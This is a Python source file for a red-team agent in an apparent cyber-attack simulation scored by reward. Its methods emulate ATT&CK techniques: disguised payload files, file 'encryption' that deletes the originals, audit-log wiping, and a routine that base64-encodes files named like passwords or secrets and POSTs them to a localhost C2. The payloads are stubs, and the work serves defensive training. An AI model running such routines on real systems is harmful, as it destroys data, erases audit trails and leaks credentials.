#!/usr/bin/env python3
"""
Project: AI Cyber War Simulation (Red Team)
Repository: https://github.com/DonHin-00/war_room.git
Frameworks: MITRE ATT&CK Matrix
"""

import os
import time
import random
import signal
import sys
import logging
import secrets
import shutil
from typing import Dict, Any, Optional

import utils
import config
import ml_engine
from agent_base import CyberAgent

class RedTeamer(CyberAgent):
    def __init__(self):
        super().__init__("RED", config.RED["ACTIONS"], config.PATHS["LOG_RED"])

        # Access Progression: Starts at DMZ
        self.access_level = "DMZ"
        self.zones = ["DMZ", "USER", "SERVER", "CORE"]
        self.traps_found = 0

    def perceive(self) -> str:
        war_state = self.state_manager.get_war_state()
        current_alert = war_state.get('blue_alert_level', 1)
        access_idx = self.zones.index(self.access_level)
        return f"{current_alert}_{access_idx}_{1 if self.traps_found > 0 else 0}"

    def get_context(self) -> Dict[str, Any]:
        return {
            "alert_level": self.state_manager.get_war_state().get('blue_alert_level', 1),
            "access_level": self.access_level,
            "traps_found": self.traps_found,
            "actions_taken": self.iteration_count
        }

    def calculate_reward(self, action_name: str, result: Dict[str, Any]) -> float:
        impact = result.get("impact", 0)
        reward = float(impact)

        if "traps_found" in result:
            self.traps_found = result["traps_found"]

        if action_name == "T1021_LATERAL_MOVE" and result.get("status") == "escalated":
            reward += config.RED["REWARDS"]["LATERAL_SUCCESS"]
        if action_name == "T1041_EXFILTRATION" and result.get("status") == "exfiltrated":
             reward += config.RED["REWARDS"]["EXFIL_SUCCESS"]
        if self.access_level == "CORE" and impact > 0:
            reward += config.RED["REWARDS"]["CRITICAL"]

        # Trigger Alerts Side Effect (Moved from Loop)
        if impact > 0 and random.random() > 0.5:
            current_alert = self.state_manager.get_war_state().get('blue_alert_level', 1)
            new_level = min(config.SYSTEM["MAX_ALERT_LEVEL"], current_alert + 1)
            if new_level != current_alert:
                 self.state_manager.update_war_state({'blue_alert_level': new_level})

        return reward

    # --- TACTICS ---
    def generate_payload(self, obfuscate=False):
        base_content = b"echo 'malware_payload'"
        if obfuscate:
            # Steganography Logic: Create fake header
            header = b"\xFF\xD8\xFF\xE0" # Fake JPG header
            padding = utils.generate_high_entropy_data(random.randint(512, 4096))
            return header + padding + base_content
        return base_content

    def t1021_lateral_move(self):
        """Attempts to escalate to the next zone."""
        current_idx = self.zones.index(self.access_level)
        if current_idx < len(self.zones) - 1:
            next_zone = self.zones[current_idx + 1]
            self.access_level = next_zone
            return {"impact": 5, "new_zone": next_zone, "status": "escalated"}
        return {"impact": 0, "status": "max_level"}

    def _get_target_dir(self):
        return config.ZONES[self.access_level]

    def t1046_recon(self):
        traps = 0
        target_dir = self._get_target_dir()
        try:
            with os.scandir(target_dir) as it:
                for entry in it:
                    if utils.is_tar_pit(entry.path): traps += 1
        except: pass
        return {"impact": 1, "traps_found": traps}

    def t1027_obfuscate(self):
        target_dir = self._get_target_dir()
        fname = f"photo_{int(time.time())}_{secrets.token_hex(4)}.jpg"
        target_file = os.path.join(target_dir, fname)
        with open(target_file, 'wb') as f:
            f.write(self.generate_payload(obfuscate=True))
        return {"impact": 3, "file": fname}

    def t1003_rootkit(self):
        target_dir = self._get_target_dir()
        fname = f".sys_shadow_{int(time.time())}_{secrets.token_hex(4)}"
        target_file = os.path.join(target_dir, fname)
        with open(target_file, 'w') as f: f.write("uid=0(root)")
        return {"impact": 5, "file": fname}

    def t1036_masquerade(self):
        target_dir = self._get_target_dir()
        names = ["readme.txt", "notes.txt", "todo.list"]
        fname = f"{random.choice(names)}_{secrets.token_hex(4)}"
        target_file = os.path.join(target_dir, fname)
        with open(target_file, 'w') as f: f.write(" benign_header=1\n")
        with open(target_file, 'ab') as f:
            f.write(self.generate_payload(obfuscate=True))
        return {"impact": 4, "file": fname}

    def t1486_encrypt(self):
        target_dir = self._get_target_dir()
        try:
            targets = []
            with os.scandir(target_dir) as it:
                for entry in it:
                    if entry.is_file() and not entry.name.endswith(".enc") and not utils.is_tar_pit(entry.path):
                        targets.append(entry.path)

            if not targets: return {"impact": 0, "status": "no_targets"}

            target = random.choice(targets)
            # Simulate reading file for encryption (binary mode)
            utils.safe_file_read(target, binary=True)

            encrypted_path = target + ".enc"
            with open(encrypted_path, 'wb') as f:
                f.write(b"ENCRYPTED_HEADER_V1")
                f.write(utils.generate_high_entropy_data(128))

            os.remove(target)
            return {"impact": 8, "target": os.path.basename(target)}
        except: return {"impact": 0, "status": "failed"}

    def t1071_c2_beacon(self):
        # Emulation: Send real HTTP POST to C2
        try:
            import urllib.request
            data = f"id={secrets.token_hex(4)}&status=active&zone={self.access_level}".encode('utf-8')
            req = urllib.request.Request("http://localhost:8080", data=data, method='POST')
            with urllib.request.urlopen(req, timeout=1) as f:
                resp = f.read().decode('utf-8')
            return {"impact": 2, "status": "connected", "response": resp}
        except Exception as e:
            # Fallback for offline mode or if server isn't up
            target_dir = self._get_target_dir()
            fname = "c2_beacon.dat"
            target_file = os.path.join(target_dir, fname)
            with open(target_file, 'a') as f:
                f.write(f"{int(time.time())}:HEARTBEAT_FALLBACK\n")
            return {"impact": 1, "status": "fallback_file"}

    def t1055_injection(self):
        # Emulation: Spawn a real background process (Ghost)
        try:
            import subprocess
            # Spawn a benign process that looks like a daemon
            # We use 'sleep' as a placeholder for a malware stub
            proc = subprocess.Popen(['sleep', '300'], start_new_session=True)

            # Record it in our persistence tracking (optional, but good for rewards)
            # We still touch the .proc dir for Blue to find it if Blue is using file scanning,
            # BUT we also want Blue to find the REAL PID.
            # Let's support both: Write metadata to .proc, but include Real PID.
            if os.path.exists(config.PATHS["PROC"]):
                 path = os.path.join(config.PATHS["PROC"], str(proc.pid))
                 with open(path, 'w') as f:
                     f.write(f"cmd: malicious_daemon\nstart: {time.time()}\nreal_pid: {proc.pid}")

            return {"impact": 5, "pid": proc.pid, "status": "injected"}
        except Exception as e:
            return {"impact": 0, "status": "failed", "error": str(e)}

    def t1070_wipe_logs(self):
        if os.path.exists(config.PATHS["AUDIT_LOG"]):
            os.remove(config.PATHS["AUDIT_LOG"])
            return {"impact": 10, "status": "wiped"}
        return {"impact": 0}

    def t1041_exfiltration(self):
        # Exfiltration over C2 Channel
        target_dir = self._get_target_dir()
        loot = []
        try:
            with os.scandir(target_dir) as it:
                for entry in it:
                    if entry.is_file():
                        # Look for high value targets
                        if any(kw in entry.name.lower() for kw in ['pass', 'secret', 'config', 'shadow', 'db']):
                            loot.append(entry.path)

            if not loot: return {"impact": 0, "status": "no_loot"}

            target = random.choice(loot)
            data = utils.safe_file_read(target, binary=True)

            # Send to C2
            import urllib.request
            # Basic obfuscation/encoding could happen here
            import base64
            encoded_data = base64.b64encode(data).decode('utf-8')

            post_body = f"type=EXFIL&file={os.path.basename(target)}&data={encoded_data}".encode('utf-8')
            req = urllib.request.Request("http://localhost:8080/exfil", data=post_body, method='POST')

            with urllib.request.urlopen(req, timeout=1) as f:
                 resp = f.read()

            return {"impact": 9, "file": os.path.basename(target), "status": "exfiltrated"}

        except Exception as e:
            return {"impact": 0, "status": "failed", "error": str(e)}

    def t1589_lurk(self):
        return {"impact": 0, "status": "lurking"}

    # --- MAIN LOOP ---
    # Inherited from CyberAgent.engage()

if __name__ == "__main__":
    RedTeamer().engage()
